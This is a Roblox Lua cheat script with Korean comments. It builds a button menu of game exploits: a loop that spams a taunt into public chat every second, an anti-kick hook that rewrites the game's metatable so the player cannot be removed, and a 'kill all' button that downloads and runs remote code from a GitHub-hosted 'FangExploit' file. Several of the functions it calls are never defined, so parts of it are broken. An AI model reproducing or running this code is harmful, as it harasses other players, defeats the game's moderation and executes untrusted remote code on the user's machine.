-- 허브 UI와 버튼에 대한 설정
local Hub = script.Parent  -- 허브 UI를 지정 (Hub가 스크립트의 부모로 설정되어 있다고 가정)

local isRunning = false
local message = "팽부대 왜함?"

-- 채팅창 더럽히기 버튼을 클릭했을 때 메시지를 보내는 함수
local function startSpamming()
    if isRunning then
        isRunning = false
        print("도배 중지")
    else
        isRunning = true
        print("도배 시작")
        spawn(function()
            while isRunning do
                game:GetService("ReplicatedStorage").SayMessageRequest:FireServer(message, "All") -- 고정된 메시지 전송
                wait(1) -- 1초 간격으로 메시지 전송
            end
        end)
    end
end

-- 버튼 생성 함수
local function createButton(parent, text, size, position)
    local Button = Instance.new("TextButton")
    Button.Parent = parent
    Button.Text = text
    Button.Size = size
    Button.Position = position
    Button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    
    Button.MouseButton1Click:Connect(function()
        -- 각 버튼 클릭 시 수행할 작업
        if text == "채팅창 더럽히기" then
            startSpamming()  -- 채팅창 더럽히기 버튼 클릭 시 도배 시작/중지
        elseif text == "안티킥 설정" then
            ACBypass1:AddButton({
                Title = "Anti Kick",
                Description = "stops local scripts from kicking you",
                Callback = function()
                    local mt = getrawmetatable(game)

                    setreadonly(mt, false)

                    local oldmt = mt.__namecall

                    mt.__namecall = newcclosure(function(Self, ...)
                        local method = getnamecallmethod()

                        if method == 'Kick' then
                            print("Tried To kick")
                            wait(9e9)
                            return nil
                        end

                        return oldmt(Self, ...)
                    end)

                    setreadonly(mt, true)
                end
            })
        elseif text == "킬올" then
            getgenv().exclude_me = false -- 본인 제외 여부
getgenv().kill = true -- 죽일지 여부
getgenv().fire = false -- 불을 붙일지 여부
local func = ({pcall(loadstring,game.HttpGet(game,"https://raw.githubusercontent.com/xsinew/scripts/refs/heads/main/FangExploit.lua"))})[2]
pcall(func,func)
        elseif text == "수갑 올" then
            showMessage("모든 플레이어에게 수갑을 채웁니다.")
            cuffAllPlayers() -- 수갑 올 함수 실행
        elseif text == "Button 5" then
            print("Button 5 클릭됨!")
        elseif text == "Button 6" then
            print("Button 6 클릭됨!")
        end
    end)

    return Button
end

-- 버튼 배치 설정
local buttonSize = UDim2.new(0.25, 0, 0.2, 0) -- 버튼 크기
local positions = {
    {0.125, 0.15}, {0.625, 0.15}, -- 첫 번째 줄 (2개)
    {0.125, 0.4}, {0.625, 0.4}, -- 두 번째 줄 (2개)
    {0.125, 0.65}, {0.625, 0.65} -- 세 번째 줄 (2개)
}

-- 허브 UI에 버튼 생성
createButton(Hub, "채팅창 더럽히기", buttonSize, UDim2.new(positions[1][1], 0, positions[1][2], 0))
createButton(Hub, "안티킥 설정", buttonSize, UDim2.new(positions[2][1], 0, positions[2][2], 0))
createButton(Hub, "킬올", buttonSize, UDim2.new(positions[3][1], 0, positions[3][2], 0))
createButton(Hub, "수갑 올", buttonSize, UDim2.new(positions[4][1], 0, positions[4][2], 0), function()
    showMessage("모든 플레이어에게 수갑을 채웁니다.")
    cuffAllPlayers() -- 수갑 올 함수 실행
end)
createButton(Hub, "Button 5", buttonSize, UDim2.new(positions[5][1], 0, positions[5][2], 0))
createButton(Hub, "Button 6", buttonSize, UDim2.new(positions[6][1], 0, positions[6][2], 0))
